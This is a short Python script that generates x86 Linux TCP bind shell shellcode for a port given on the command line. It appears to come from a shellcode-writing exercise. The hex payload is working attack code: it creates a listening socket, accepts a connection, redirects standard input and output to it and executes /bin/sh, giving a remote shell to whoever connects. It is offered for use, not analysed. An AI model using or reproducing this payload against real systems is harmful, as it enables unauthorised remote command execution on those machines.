import sys;

def main():
	if len(sys.argv) != 2:
		print( "Usage: python {0} <PORT>".format(sys.argv[0]))
		exit()

	try:
		port = int(sys.argv[1])
	except:
		print( "Do you know what port is?")
		exit()

	if port < 1 or port > 65535:
		print( "Go Learn Network Basics!!")
		exit()
	if port < 1024:
		print( "Are you root to create a bind shell on {0}?".format(sys.argv[1]))

	hexPort = "{0:#0{1}x}".format(port,6)
	
	shellcode = "\\x31\\xc0\\x31\\xdb\\x99\\x52\\x42\\x52\\x42\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x99\\x43\\x52\\x66\\x68\\x" + hexPort[-4:-2] + "\\x" + hexPort[-2:] + "\\x66\\x53\\x89\\xe1\\x92\\x6a\\x10\\x51\\x52\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x50\\x52\\xb0\\x66\\xb3\\x04\\x89\\xe1\\xcd\\x80\\x50\\x50\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x41\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x99\\xcd\\x80"

	print( "Here is your TCP Bind Shell shellcode\n")
	print( shellcode )

if __name__ == "__main__":
	main()